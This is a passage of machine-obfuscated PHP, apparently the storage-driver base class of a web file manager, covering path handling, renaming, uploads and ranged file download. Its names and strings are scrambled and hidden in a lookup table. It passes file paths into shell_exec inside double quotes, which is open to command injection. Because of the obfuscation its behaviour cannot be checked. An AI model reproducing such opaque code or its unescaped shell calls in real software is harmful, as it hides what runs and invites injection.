É[$aÊ½çóÄ£œ[357]]) { return !1; } return parent::update($f¿ÙíÚÎÂ², $aÑ•ÈÃ•åã); } public function remove($f˜†çÛÇé) { $aêñî™’Ş = $this->listData($f˜†çÛÇé); if (!$aêñî™’Ş || $aêñî™’Ş[$_SERVER[ÍÓÖ€°å][799]]) { return !1; } return parent::remove($f˜†çÛÇé); } public function enable($Ešá±×·ö›) { $AÂ£¡Î¼» =& $_SERVER[ÍÓÖ€°å]; $fĞÉåöí¶ = $this->listData($Ešá±×·ö›); $DæÛÀµ¸ªÖ = !$fĞÉåöí¶[$AÂ£¡Î¼»[1035]]; return $this->update($Ešá±×·ö›, array($AÂ£¡Î¼»[1867] => $DæÛÀµ¸ªÖ)); } public function run($bÁå£Ñ¦µ„) { return $this->update($bÁå£Ñ¦µ„, array($_SERVER[ÍÓÖ€°å][1868] => time())); } } goto EÖ¼¤ÓŠá; D©¡¯†Î´¿: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $AÍ½•ğÂŸ¡ =& $_SERVER[ÍÓÖ€°å]; $this->objectDriver = array($AÍ½•ğÂŸ¡[57], $AÍ½•ğÂŸ¡[58], $AÍ½•ğÂŸ¡[59], $AÍ½•ğÂŸ¡[60], $AÍ½•ğÂŸ¡[61], $AÍ½•ğÂŸ¡[62], $AÍ½•ğÂŸ¡[63], $AÍ½•ğÂŸ¡[64], $AÍ½•ğÂŸ¡[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($bµ‡¹Ë¹š) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($bµ‡¹Ë¹š, $_SERVER[ÍÓÖ€°å][8]); } return $bµ‡¹Ë¹š; } public function getPathName($f›çÄ‰äÇ¬) { return $f›çÄ‰äÇ¬; } public function iconvApp($B—»ŒÇ…ë) { return $B—»ŒÇ…ë; } public function iconvSystem($bô‚¶Ô¹) { return $bô‚¶Ô¹; } public function iconvTo($e‰è÷ÌŸö¿, $EÕ÷†ø½Ù¿, $D®¢™¶Õæ©) { goto eÔµ‚“…âÉ; AÆ––ªÒ: $döÖÊ…Ç¥³ = $EÕ÷†ø½Ù¿ . $A¡İç•ºİ[67] . $D®¢™¶Õæ© . $A¡İç•ºİ[68] . $e‰è÷ÌŸö¿; if (isset($dÑøŞ§Ö“Ö[$döÖÊ…Ç¥³])) { return $dÑøŞ§Ö“Ö[$döÖÊ…Ç¥³]; } if (function_exists($A¡İç•ºİ[69])) { $fŒ¯‡‚ò— = @mb_convert_encoding($e‰è÷ÌŸö¿, $D®¢™¶Õæ©, $EÕ÷†ø½Ù¿); } else { $fŒ¯‡‚ò— = @iconv($EÕ÷†ø½Ù¿, $D®¢™¶Õæ©, $e‰è÷ÌŸö¿); } goto eëæ¾ÍÎÙ; eÔµ‚“…âÉ: $A¡İç•ºİ =& $_SERVER[ÍÓÖ€°å]; if (!$e‰è÷ÌŸö¿ || !function_exists($A¡İç•ºİ[66])) { return $e‰è÷ÌŸö¿; } static $dÑøŞ§Ö“Ö = array(); goto AÆ––ªÒ; eëæ¾ÍÎÙ: $fŒ¯‡‚ò— = $fŒ¯‡‚ò— ? $fŒ¯‡‚ò— : $e‰è÷ÌŸö¿; if (strstr($fŒ¯‡‚ò—, $A¡İç•ºİ[70])) { $fŒ¯‡‚ò— = str_replace($A¡İç•ºİ[70], $A¡İç•ºİ[71], $fŒ¯‡‚ò—); } $dÑøŞ§Ö“Ö[$EÕ÷†ø½Ù¿ . $A¡İç•ºİ[67] . $D®¢™¶Õæ© . $A¡İç•ºİ[68] . $e‰è÷ÌŸö¿] = $fŒ¯‡‚ò—; goto C½ªƒÑÚÅ; a†Ÿ°Åã˜Â: return $fŒ¯‡‚ò—; goto b´ãíö¸›å; C½ªƒÑÚÅ: $dÑøŞ§Ö“Ö[$D®¢™¶Õæ© . $A¡İç•ºİ[67] . $EÕ÷†ø½Ù¿ . $A¡İç•ºİ[68] . $e‰è÷ÌŸö¿] = $e‰è÷ÌŸö¿; $dÑøŞ§Ö“Ö[$D®¢™¶Õæ© . $A¡İç•ºİ[67] . $EÕ÷†ø½Ù¿ . $A¡İç•ºİ[68] . $fŒ¯‡‚ò—] = $e‰è÷ÌŸö¿; $dÑøŞ§Ö“Ö[$EÕ÷†ø½Ù¿ . $A¡İç•ºİ[67] . $D®¢™¶Õæ© . $A¡İç•ºİ[68] . $fŒ¯‡‚ò—] = $fŒ¯‡‚ò—; goto a†Ÿ°Åã˜Â; b´ãíö¸›å: } public function getPathInner($AØùÇÑãÅÇ) { $dË£‚™Â¹§ = IO::init($AØùÇÑãÅÇ); return $dË£‚™Â¹§->path; } public function getPathOuter($d°Åò„œ¤Ï) { $AÅŠ§ÍÙË =& $_SERVER[ÍÓÖ€°å]; $e›¥á›´ì„ = strlen(trim($this->pathBase, $AÅŠ§ÍÙË[8])); $d°Åò„œ¤Ï = substr(trim($d°Åò„œ¤Ï, $AÅŠ§ÍÙË[8]), $e›¥á›´ì„); return $this->pathDriver . $AÅŠ§ÍÙË[8] . ltrim($d°Åò„œ¤Ï, $AÅŠ§ÍÙË[8]); } public function isParentOf($CÄ¦›ßµ˜À, $Eãê“ëğ†‘) { $FÃ«ºğ„ =& $_SERVER[ÍÓÖ€°å]; $CÄ¦›ßµ˜À = rtrim(strtolower($CÄ¦›ßµ˜À), $FÃ«ºğ„[8]) . $FÃ«ºğ„[8]; $Eãê“ëğ†‘ = rtrim(strtolower($Eãê“ëğ†‘), $FÃ«ºğ„[8]) . $FÃ«ºğ„[8]; $e¶Ë°èÊŸ = strpos($Eãê“ëğ†‘, $CÄ¦›ßµ˜À) === 0; return $e¶Ë°èÊŸ; } public function getType() { $FÌè“Ç¾Ã¹ =& $_SERVER[ÍÓÖ€°å]; $cæÔå³™ùæ = str_replace($FÌè“Ç¾Ã¹[72], $FÌè“Ç¾Ã¹[33], get_class($this)); return strtolower($cæÔå³™ùæ); } public function isTypeObject() { return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($c“¢Å÷µÈ•, $EÏ„õŸÃÚ–) { $b«ÙËÜìÚ‘ =& $_SERVER[ÍÓÖ€°å]; $AŸà…Ã¦¸œ = rtrim($c“¢Å÷µÈ•, $b«ÙËÜìÚ‘[8]) . $b«ÙËÜìÚ‘[8] . $EÏ„õŸÃÚ–; $cºã‰İñËš = $this->exist($AŸà…Ã¦¸œ); return $cºã‰İñËš ? $AŸà…Ã¦¸œ : !1; } public function renameObject($A²‚Â’ÃÏİ, $A°™Á°ëô¥) { $b¢õ¥Á¿ÑŒ =& $_SERVER[ÍÓÖ€°å]; Hook::trigger($b¢õ¥Á¿ÑŒ[73], $this, $A²‚Â’ÃÏİ, $this, $this->pathFather($A²‚Â’ÃÏİ) . $A°™Á°ëô¥); $A²‚Â’ÃÏİ = $this->getPathOuter($A²‚Â’ÃÏİ); $A°™Á°ëô¥ = $this->pathFather($A²‚Â’ÃÏİ) . $A°™Á°ëô¥; if (IO::isFile($A²‚Â’ÃÏİ)) { $Añ¼Š±Õë³ = IO::move($A²‚Â’ÃÏİ, $A°™Á°ëô¥, REPEAT_RENAME_FOLDER); } else { $Añ¼Š±Õë³ = IO::mkdir($A°™Á°ëô¥); if (!$Añ¼Š±Õë³) { return !1; } $dò«½°…ô = IO::listPath($A²‚Â’ÃÏİ); $D«Ã›ğàô¿ = array_merge($dò«½°…ô[$b¢õ¥Á¿ÑŒ[74]], $dò«½°…ô[$b¢õ¥Á¿ÑŒ[75]]); foreach ($D«Ã›ğàô¿ as $cè¸ªŒãµç) { IO::move($cè¸ªŒãµç[$b¢õ¥Á¿ÑŒ[76]], $A°™Á°ëô¥, REPEAT_RENAME_FOLDER); } IO::remove($A²‚Â’ÃÏİ); } return $Añ¼Š±Õë³ ? $A°™Á°ëô¥ : !1; } public function isType($fÛ‰ŠâÇÆ×, $E»Å‡‚â­ğ) { return strtolower($E»Å‡‚â­ğ) == $this->getType(); } public function tempFile($f‰æŞ¶¾œõ = '', $e‚ˆšà½˜’ = '') { goto f¦™¢¡½­; f¦™¢¡½­: if (!$f‰æŞ¶¾œõ) { $f‰æŞ¶¾œõ = rand_string(15); } $CË»í»²³¡ = TEMP_FILES . rand_string(15) . $_SERVER[ÍÓÖ€°å][8]; @mkdir($CË»í»²³¡, 511, !0); goto B„Ïšº›Š¨; B„Ïšº›Š¨: $a‰›‚™Óô† = $CË»í»²³¡ . $f‰æŞ¶¾œõ; @touch($a‰›‚™Óô†); if ($e‚ˆšà½˜’) { file_put_contents($a‰›‚™Óô†, $e‚ˆšà½˜’); } goto A…ª„ÎìÌ­; A…ª„ÎìÌ­: return $a‰›‚™Óô†; goto CÏÎò˜¿Å; CÏÎò˜¿Å: } public function tempFileRemve($B¢¥À¥ïİ£) { @unlink($B¢¥À¥ïİ£); @rmdir($this->pathFather($B¢¥À¥ïİ£)); } public function mkfile($Bù¬÷È’Á§, $fÚÚñ±«­ = '', $aØƒ”ò°šÄ = REPEAT_RENAME) { } public function mkdir($F©Ğ¾âùÅ, $f†Öëíøİ¼ = REPEAT_SKIP) { } public function copyFile($A¶““İ®¸Ä, $DÑ²’“é»¹) { } public function moveFile($fò›ÑÑÜª¸, $B±«—Øôâ“) { } public function remove($EÅ¤õî¡Ã“) { if ($this->isFile($EÅ¤õî¡Ã“)) { return $this->delFile($EÅ¤õî¡Ã“); } return $this->delFolder($EÅ¤õî¡Ã“); } public function rename($b¡°“ê³æ, $f¿–“ÒîÌÏ) { } public function exist($DÌÉ¦òÇëÛ) { } public function findByHash($CÃ–à¼¤ïÇ = '', $B‘ŸÇÌ¨±» = '') { return !1; } public function isFile($DĞµÀ™¯‡) { } public function isFolder($dñ¹Öï’äÙ) { } public function size($F˜±ğÒ™÷) { } public function info($bÑ¢å²á×) { } public function infoAuth($E³è·Üõ½) { return $this->info($E³è·Üõ½); } public function infoFull($C´—¹¹«Ô²) { return $this->info($C´—¹¹«Ô²); } public function infoWithChildren($aÖ„¤­¡¬Ğ) { $bàÅ¤İ¢Ñ˜ =& $_SERVER[ÍÓÖ€°å]; $d¥¾ØÙÔ¦ø = $this->info($aÖ„¤­¡¬Ğ); if ($d¥¾ØÙÔ¦ø && $d¥¾ØÙÔ¦ø[$bàÅ¤İ¢Ñ˜[29]] == $bàÅ¤İ¢Ñ˜[77]) { $Dãæİ¢‡é = array($bàÅ¤İ¢Ñ˜[78] => 0, $bàÅ¤İ¢Ñ˜[79] => 0, $bàÅ¤İ¢Ñ˜[80] => 0); $this->infoChildren($aÖ„¤­¡¬Ğ, $Dãæİ¢‡é); $d¥¾ØÙÔ¦ø[$bàÅ¤İ¢Ñ˜[78]] = $Dãæİ¢‡é[$bàÅ¤İ¢Ñ˜[78]]; $d¥¾ØÙÔ¦ø[$bàÅ¤İ¢Ñ˜[81]] = array($bàÅ¤İ¢Ñ˜[82] => $Dãæİ¢‡é[$bàÅ¤İ¢Ñ˜[79]], $bàÅ¤İ¢Ñ˜[83] => $Dãæİ¢‡é[$bàÅ¤İ¢Ñ˜[80]]); } return $d¥¾ØÙÔ¦ø; } public function listPath($FßÂš»‘é„, $Cì˜âÂÊïê = false, $Fíí×åÈŸ = false) { } public function has($AŠ¢‘òô±ƒ, $b¸Ğàó = false) { } public function canRead($cÎĞ››œ µ) { } public function canWrite($eİî±÷…ì) { } public function getContent($D¥šÉÒèÒ¬) { } public function setContent($C¬ñÂéº¾¥, $Bó£­›é´ˆ = '') { } protected function infoChildren($D¹ìïìŠÊ”, &$AºÒ¢­Ãã¿) { $b‡·•ã¤¿Ö =& $_SERVER[ÍÓÖ€°å]; $e„Ù¢Ìğ‡ = $this->listPath($D¹ìïìŠÊ”, !1, !0); $e„Ù¢Ìğ‡ = array_merge($e„Ù¢Ìğ‡[$b‡·•ã¤¿Ö[75]], $e„Ù¢Ìğ‡[$b‡·•ã¤¿Ö[74]]); foreach ($e„Ù¢Ìğ‡ as $Fì´í°›¶è) { if ($Fì´í°›¶è[$b‡·•ã¤¿Ö[29]] == $b‡·•ã¤¿Ö[77]) { $AºÒ¢­Ãã¿[$b‡·•ã¤¿Ö[80]]++; $dä­Ö¿…î = $this->getPathInner($Fì´í°›¶è[$b‡·•ã¤¿Ö[76]]); $this->infoChildren($dä­Ö¿…î, $AºÒ¢­Ãã¿); } else { $AºÒ¢­Ãã¿[$b‡·•ã¤¿Ö[79]]++; $AºÒ¢­Ãã¿[$b‡·•ã¤¿Ö[78]] += $Fì´í°›¶è[$b‡·•ã¤¿Ö[78]]; } } } public function fileSubstr($DŞ­ò×ì˜Ò, $eã„¯œ¼¤â, $dï…öĞ) { } public function listAll($A¿µÓ¤ßÍ×) { } public function upload($b¿ÑŠ­Èå×, $bÚÊµ, $aŞ„ğÛÄ«Ù = false, $fóŸâÀ·Ø = REPEAT_REPLACE) { } public function uploadFileByID($e™³·İ”µ, $cã¦ôÎÅõª, $dïËÉ¨) { } public function uploadFileByPath($DáÔÛëß¤ë, $bÔ…—£ ÃŠ, $b…øÛ´ÔÂ = array()) { } public function uploadLink($A–ÏÔ²°, $E‰¡ïÜ¨î = 0) { goto bØ‡†‚…Ü¢; bØ‡†‚…Ü¢: $eÔ°Ö°­åô =& $_SERVER[ÍÓÖ€°å]; if ($GLOBALS[$eÔ°Ö°­åô[6]][$eÔ°Ö°­åô[84]][$eÔ°Ö°­åô[85]]) { return; } $Aïùª×­¦æ = $this->getType(); goto E¡¼Î‚Ñ‡„; E¡¼Î‚Ñ‡„: if (!in_array($Aïùª×­¦æ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $EÇ‚¶ñğ¼ø = 1024 * 1024 * 20; goto c‰šªÈöØ; fä‰™»‰¼£: return $c™ÈøõÇÛÄ; goto a‚°ç°•×‚; c‰šªÈöØ: $eÛ®ïË±ë¢ = $E‰¡ïÜ¨î <= $EÇ‚¶ñğ¼ø ? $eÔ°Ö°­åô[86] : $eÔ°Ö°­åô[87]; if ($Aïùª×­¦æ == $eÔ°Ö°­åô[61]) { $eÛ®ïË±ë¢ = $eÔ°Ö°­åô[87]; } if ($Aïùª×­¦æ == $eÔ°Ö°­åô[65] && $E‰¡ïÜ¨î >= 1024 * 1024 * 10) { $eÛ®ïË±ë¢ = $eÔ°Ö°­åô[87]; } goto CÉ´õùÖ; CÉ´õùÖ: $Bğ‹Œ”£Å = (!$E‰¡ïÜ¨î ? 1 : ceil($E‰¡ïÜ¨î / pow(1024, 3))) * 3600 * 4; $c™ÈøõÇÛÄ = $this->{$eÛ®ïË±ë¢}($A–ÏÔ²°, $Bğ‹Œ”£Å); if ($c™ÈøõÇÛÄ) { $c™ÈøõÇÛÄ[$eÔ°Ö°­åô[88]] = $A–ÏÔ²°; $c™ÈøõÇÛÄ[$eÔ°Ö°­åô[89]] = $Aïùª×­¦æ; } goto fä‰™»‰¼£; a‚°ç°•×‚: } public function uploadFormData($Fõ‡‘‘Â¯ö, $f×Í¹¦Ä = 3600) { } public function multiUploadFormData($cÏñå…­Æ°, $FÓ­ó†„ƒ = 3600) { } public function download($A ¥‹ƒÛ©é, $FÙ¡‚¥†Æ) { } public function ext($cƒ»ÍÄÈÙ‰) { $B•¨İÔ¡­à =& $_SERVER[ÍÓÖ€°å]; if (strpos($cƒ»ÍÄÈÙ‰, $B•¨İÔ¡­à[8]) === -1) { $EŠ„àÁùé¿ = $cƒ»ÍÄÈÙ‰; } else { $EŠ„àÁùé¿ = $this->pathThis($cƒ»ÍÄÈÙ‰); } $cÏò›ˆİõ = $B•¨İÔ¡­à[33]; if (strstr($EŠ„àÁùé¿, $B•¨İÔ¡­à[90])) { $cÏò›ˆİõ = substr($EŠ„àÁùé¿, strrpos($EŠ„àÁùé¿, $B•¨İÔ¡­à[90]) + 1); $cÏò›ˆİõ = strtolower($cÏò›ˆİõ); } if (strlen($cÏò›ˆİõ) > 3 && preg_match($B•¨İÔ¡­à[91], $cÏò›ˆİõ, $e‘Ò©”á)) { $cÏò›ˆİõ = $B•¨İÔ¡­à[33]; } return $cÏò›ˆİõ; } public function pathThis($A¥Ä¨Šë) { $B ƒİçœÒÇ =& $_SERVER[ÍÓÖ€°å]; $A¥Ä¨Šë = str_replace($B ƒİçœÒÇ[92], $B ƒİçœÒÇ[8], rtrim($A¥Ä¨Šë, $B ƒİçœÒÇ[8])); $D–ß ¿¢íá = strrpos($A¥Ä¨Šë, $B ƒİçœÒÇ[8]); if ($D–ß ¿¢íá === !1) { return $A¥Ä¨Šë; } return substr($A¥Ä¨Šë, $D–ß ¿¢íá + 1); } public function pathFather($A²Ó¸áƒô‘) { $DòÑÃ°É˜µ =& $_SERVER[ÍÓÖ€°å]; $A²Ó¸áƒô‘ = str_replace($DòÑÃ°É˜µ[92], $DòÑÃ°É˜µ[8], rtrim($A²Ó¸áƒô‘, $DòÑÃ°É˜µ[8])); $D©ÉŠ”ö£ˆ = strrpos($A²Ó¸áƒô‘, $DòÑÃ°É˜µ[8]); if ($D©ÉŠ”ö£ˆ === !1) { return $DòÑÃ°É˜µ[33]; } return substr($A²Ó¸áƒô‘, 0, $D©ÉŠ”ö£ˆ + 1); } public function hashSimple($B¤Î¡½ôší) { goto AéãÔóÚÆ‡; Eô¬”Õ•: $DØô‚«ï®Û = intval($b²éÂÎ‹ÖÈ / $eßÇ¢½»½); $CñÑá­ãÉÒ = $d¼îÕÛÜŞá[33]; for ($cËö‰¥¤† = 0; $cËö‰¥¤† < $eßÇ¢½»½; $cËö‰¥¤†++) { $CñÑá­ãÉÒ .= $this->fileSubstr($B¤Î¡½ôší, $DØô‚«ï®Û * $cËö‰¥¤†, $DÊ¸µîóò); } goto E¯ °¿Íùø; AéãÔóÚÆ‡: $d¼îÕÛÜŞá =& $_SERVER[ÍÓÖ€°å]; if (!$B¤Î¡½ôší) { return md5($d¼îÕÛÜŞá[33]); } $b²éÂÎ‹ÖÈ = $this->size($B¤Î¡½ôší); goto B¹èÆ ÷ŒÂ; B¹èÆ ÷ŒÂ: $DÊ¸µîóò = 200; $eßÇ¢½»½ = 50; if ($b²éÂÎ‹ÖÈ <= $DÊ¸µîóò * $eßÇ¢½»½) { return $this->hashMd5($B¤Î¡½ôší) . $b²éÂÎ‹ÖÈ; } goto Eô¬”Õ•; E¯ °¿Íùø: $CñÑá­ãÉÒ .= $this->fileSubstr($B¤Î¡½ôší, $b²éÂÎ‹ÖÈ - $DÊ¸µîóò, $DÊ¸µîóò); return md5($CñÑá­ãÉÒ) . $b²éÂÎ‹ÖÈ; goto fÅÓëÂ¬Û¾; fÅÓëÂ¬Û¾: } public static $md5Cache = array(); public function hashMd5($D÷“èĞµîà) { $D÷“èĞµîà = $this->iconvSystem($D÷“èĞµîà); if (isset(self::$md5Cache[$D÷“èĞµîà])) { return self::$md5Cache[$D÷“èĞµîà]; } self::$md5Cache[$D÷“èĞµîà] = $this->hashMd5Shell($D÷“èĞµîà); if (!self::$md5Cache[$D÷“èĞµîà]) { self::$md5Cache[$D÷“èĞµîà] = @md5_file($D÷“èĞµîà); } return self::$md5Cache[$D÷“èĞµîà]; } private function hashMd5Shell($A–é‰—˜¹) { goto cäèçï•£å; C¼æ…·¼¹ô: $D¤±ˆÍ‘Ş« = Cache::get($A¢Ç²ÖÒ•³[96]); if (!$D¤±ˆÍ‘Ş«) { $CÀïåÊ­Õè = BASIC_PATH . $A¢Ç²ÖÒ•³[97]; $eË’…±Ë£‘ = md5_file($CÀïåÊ­Õè); $D¤±ˆÍ‘Ş« = $A¢Ç²ÖÒ•³[98]; foreach ($f„î³÷—ƒ¶ as $FÛé•ë‚Ø·) { $e¼™†Ã¹â = shell_exec($FÛé•ë‚Ø· . "\40\42{$CÀïåÊ­Õè}\42"); if ($e¼™†Ã¹â && substr(trim($e¼™†Ã¹â), 0, 32) == $eË’…±Ë£‘) { $D¤±ˆÍ‘Ş« = $FÛé•ë‚Ø·; break; } } Cache::set($A¢Ç²ÖÒ•³[96], $D¤±ˆÍ‘Ş«, 3600); } if ($D¤±ˆÍ‘Ş« == $A¢Ç²ÖÒ•³[98]) { return !1; } goto cŒìœªœæ; cäèçï•£å: $A¢Ç²ÖÒ•³ =& $_SERVER[ÍÓÖ€°å]; if (!function_exists($A¢Ç²ÖÒ•³[93])) { return !1; } $f„î³÷—ƒ¶ = array($A¢Ç²ÖÒ•³[94], $A¢Ç²ÖÒ•³[95]); goto C¼æ…·¼¹ô; cŒìœªœæ: $e¼™†Ã¹â = shell_exec($D¤±ˆÍ‘Ş« . "\40\42{$A–é‰—˜¹}\42"); return substr($e¼™†Ã¹â, 0, 32); goto D÷“ª¦‚Á·; D÷“ª¦‚Á·: } public function link($cÌ©êª˜) { return $cÌ©êª˜; } public function fileOut($Eî‚•Ş† , $A®­ìÊÅŒ = false, $DíÄÓå„°¨ = false, $DØÙÍïä¤® = '') { goto EËÄãé™±; EËÄãé™±: $C®ˆÒö÷¬ =& $_SERVER[ÍÓÖ€°å]; if (!$Eî‚•Ş†  || !$this->exist($Eî‚•Ş† )) { show_json(LNG($C®ˆÒö÷¬[99]), !1, $DíÄÓå„°¨); } @ob_end_clean(); goto bÊë¦ƒœäĞ; B‘­Şøëø: $eƒô¥Î§ã½ = rawurlencode($B•Õøš©®); $eƒô¥Î§ã½ = $C®ˆÒö÷¬[102] . $eƒô¥Î§ã½ . $C®ˆÒö÷¬[106] . $eƒô¥Î§ã½; if ($A®­ìÊÅŒ) { header($C®ˆÒö÷¬[107]); header($C®ˆÒö÷¬[108] . $eƒô¥Î§ã½); } else { header($C®ˆÒö÷¬[109] . $eƒô¥Î§ã½); } goto B¤Åµ¬àò; b”Š¤±Îèç: $BÄ¥‚’‚Â’ = get_file_mime($this->ext($B•Õøš©®)); if (strstr($BÄ¥‚’‚Â’, $C®ˆÒö÷¬[103])) { $BÄ¥‚’‚Â’ = $BÄ¥‚’‚Â’ . $C®ˆÒö÷¬[104]; } if ($A®­ìÊÅŒ === !1 && !mime_support($BÄ¥‚’‚Â’)) { $A®­ìÊÅŒ = !0; $BÄ¥‚’‚Â’ = $C®ˆÒö÷¬[105]; } goto B‘­Şøëø; Eˆ½îêÄæÃ: header($C®ˆÒö÷¬[124]); $D«ğ¥¤Ğ¬ = $this->getType() == $C®ˆÒö÷¬[125]; $F»‚¢¨Êµ« = $GLOBALS[$C®ˆÒö÷¬[6]][$C®ˆÒö÷¬[84]][$C®ˆÒö÷¬[126]][$C®ˆÒö÷¬[127]]; goto eÊ×ëĞ‹·; A­ù§è÷ºâ: if (isset($_SERVER[$C®ˆÒö÷¬[118]]) && $_SERVER[$C®ˆÒö÷¬[118]] == $DØÙÍïä¤®) { header($C®ˆÒö÷¬[119] . $DØÙÍïä¤®, !0, 304); die; } header($C®ˆÒö÷¬[119] . $DØÙÍïä¤®); header($C®ˆÒö÷¬[120] . $aÊÆÚ«¹ïİ . $C®ˆÒö÷¬[112]); goto fœŞêêã’¦; f¿æËØ¼à‹: $aÊÆÚ«¹ïİ = gmdate($C®ˆÒö÷¬[100], $Eˆá÷ê¬Ô‚[$C®ˆÒö÷¬[101]]); $B•Õøš©® = $DíÄÓå„°¨ ? $DíÄÓå„°¨ : $this->iconvApp($Eˆá÷ê¬Ô‚[$C®ˆÒö÷¬[28]]); $F›¢„‹¡ = 0; goto CøˆŞòÃï»; eÊ×ëĞ‹·: $B²ó­…  = $GLOBALS[$C®ˆÒö÷¬[6]][$C®ˆÒö÷¬[84]][$C®ˆÒö÷¬[126]][$C®ˆÒö÷¬[128]] * 1024 * 1024; $aÈ˜©»ÅÄ = strtolower($_SERVER[$C®ˆÒö÷¬[129]]); if ($D«ğ¥¤Ğ¬ && $aÈ˜©»ÅÄ && $F»‚¢¨Êµ«) { if (strstr($aÈ˜©»ÅÄ, $C®ˆÒö÷¬[130])) { header($C®ˆÒö÷¬[131] . $Eî‚•Ş† ); } else { if (strstr($aÈ˜©»ÅÄ, $C®ˆÒö÷¬[132])) { header($C®ˆÒö÷¬[133] . $Eî‚•Ş† ); } else { if (strstr($aÈ˜©»ÅÄ, $C®ˆÒö÷¬[134])) { header($C®ˆÒö÷¬[135] . $Eî‚•Ş† ); } } } if ($B²ó­… ) { header($C®ˆÒö÷¬[136] . $B²ó­… ); } return; } goto B«§¹Âğ‚Ï; AêåŒìÅó‚: $Aƒ‘­ãºÉ = 1024 * 100; $aîƒ‘İ†²§ = 0; if ($B²ó­… ) { $aîƒ‘İ†²§ = 1000 * 1000 / 100; } goto C…»·çµ÷; bÊë¦ƒœäĞ: set_timeout(); $Eˆá÷ê¬Ô‚ = $this->infoFull($Eî‚•Ş† ); $eŒîîÔ‰ç = $Eˆá÷ê¬Ô‚[$C®ˆÒö÷¬[78]]; goto f¿æËØ¼à‹; B«§¹Âğ‚Ï: if (isset($_SERVER[$C®ˆÒö÷¬[137]])) { if (preg_match($C®ˆÒö÷¬[138], $_SERVER[$C®ˆÒö÷¬[137]], $cÁÉ×¾—¨ç)) { $F›¢„‹¡ = intval($cÁÉ×¾—¨ç[1]); if (!empty($cÁÉ×¾—¨ç[2])) { $DÔÉ¦Ÿß = intval($cÁÉ×¾—¨ç[2]); } } header($C®ˆÒö÷¬[139]); header("\103\x6f\156\x74\x65\156\x74\55\x52\141\156\147\x65\x3a\x20\142\171\x74\145\x73\x20{$F›¢„‹¡}\x2d{$DÔÉ¦Ÿß}\x2f" . $eŒîîÔ‰ç); } else { header($C®ˆÒö÷¬[140]); } header($C®ˆÒö÷¬[141] . ($DÔÉ¦Ÿß - $F›¢„‹¡ + 1)); if ($_SERVER[$C®ˆÒö÷¬[142]] == $C®ˆÒö÷¬[143]) { return; } goto AêåŒìÅó‚; C…»·çµ÷: while ($F›¢„‹¡ <= $DÔÉ¦Ÿß) { $B’®ìõçÛÖ = $DÔÉ¦Ÿß - $F›¢„‹¡ + 1; if ($B’®ìõçÛÖ <= $Aƒ‘­ãºÉ) { $Aƒ‘­ãºÉ = $B’®ìõçÛÖ; } echo $this->fileSubstr($Eî‚•Ş† , $F›¢„‹¡, $Aƒ‘­ãºÉ); $F›¢„‹¡ += $Aƒ‘­ãºÉ; if ($Aƒ‘­ãºÉ == $B’®ìõçÛÖ) { $F›¢„‹¡ = $DÔÉ¦Ÿß + 1; } if ($B²ó­… ) { usleep($aîƒ‘İ†²§); } } goto BŒ‚ßŞ×Ù; CøˆŞòÃï»: $DÔÉ¦Ÿß = $eŒîîÔ‰ç - 1; if (!$DØÙÍïä¤®) { $DØÙÍïä¤® = md5($aÊÆÚ«¹ïİ . $this->hashSimple($Eî‚•Ş† )); } $DØÙÍïä¤® = $C®ˆÒö÷¬[102] . $DØÙÍïä¤® . $C®ˆÒö÷¬[102]; goto b”Š¤±Îèç; fœŞêêã’¦: header($C®ˆÒö÷¬[121] . $B•Õøš©®); header($C®ˆÒö÷¬[122]); header($C®ˆÒö÷¬[123] . $eŒîîÔ‰ç); goto Eˆ½îêÄæÃ; A´ÄÈÓÃÌ: header($C®ˆÒö÷¬[114]); header($C®ˆÒö÷¬[115]); if (isset($_SERVER[$C®ˆÒö÷¬[116]]) && strtotime($_SERVER[$C®ˆÒö÷¬[116]]) == $Eˆá÷ê¬Ô‚[$C®ˆÒö÷¬[101]]) { header($C®ˆÒö÷¬[117], !0, 304); die; } goto A­ù§è÷ºâ; B¤Åµ¬àò: header($C®ˆÒö÷¬[110] . $BÄ¥‚’‚Â’); header($C®ˆÒö÷¬[111] . gmdate($C®ˆÒö÷¬[100], time() + 3600 * 24 * 30) . $C®ˆÒö÷¬[112]); header($C®ˆÒö÷¬[113]); goto A´ÄÈÓÃÌ; BŒ‚ßŞ×Ù: } public function fileOutServer($C™äˆ‹Îêƒ, $Dï§¸Ê¨ª˜ = false, $f«„Ä¹…Õ = false, $E¡¦ƒÕÙª = '') { self::fileOut($C™äˆ‹Îêƒ, $Dï§¸Ê¨ª˜, $f«„Ä¹…Õ, $E¡¦ƒÕÙª); } public function fileOutLink($bôõ‘„ŸÏƒ) { $Cê®¡‚å§ =& $_SERVER[ÍÓÖ€°å]; if (substr($bôõ‘„ŸÏƒ, 0, 7) == $Cê®¡‚å§[144]) { $bôõ‘„ŸÏƒ = $Cê®¡‚å§[145] . substr($bôõ‘„ŸÏƒ, 7); } header($Cê®¡‚å§[146] . $bôõ‘„ŸÏƒ); die; } public function fileOutImage($dø¢ïŒÓõ, $bº™Æ»Õ‘— = 250) { goto D†µŒĞØ–»; EíË¯Ê·­™: if (!($AŒˆƒÓŞ¡æ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $fù’Š¯‰Ö§[153]))) { $bö‹Œ°´àÎ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $fù’Š¯‰Ö§[154]); } else { $bö‹Œ°´àÎ = KodIO::make($AŒˆƒÓŞ¡æ); } if ($AŒˆƒÓŞ¡æ = IO::fileNameExist($bö‹Œ°´àÎ, $A»ä–Ô©¹º)) { $B±¦Ò¥ì¨È = KodIO::make($AŒˆƒÓŞ¡æ); return IO::fileOut($B±¦Ò¥ì¨È); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto B£¹Ø¸™Î; D†µŒĞØ–»: $fù’Š¯‰Ö§ =& $_SERVER[ÍÓÖ€°å]; if (substr($dø¢ïŒÓõ, 0, 4) == $fù’Š¯‰Ö§[134]) { $this->fileOutLink($dø¢ïŒÓõ); } $EÆ„ˆäØÔª = $this->info($dø¢ïŒÓõ); goto bªÂæë†ç•; bªÂæë†ç•: if ($EÆ„ˆäØÔª[$fù’Š¯‰Ö§[78]] <= 1024 * 50 || !function_exists($fù’Š¯‰Ö§[147]) || $EÆ„ˆäØÔª[$fù’Š¯‰Ö§[148]] == $fù’Š¯‰Ö§[149]) { return $this->fileOut($dø¢ïŒÓõ); } if 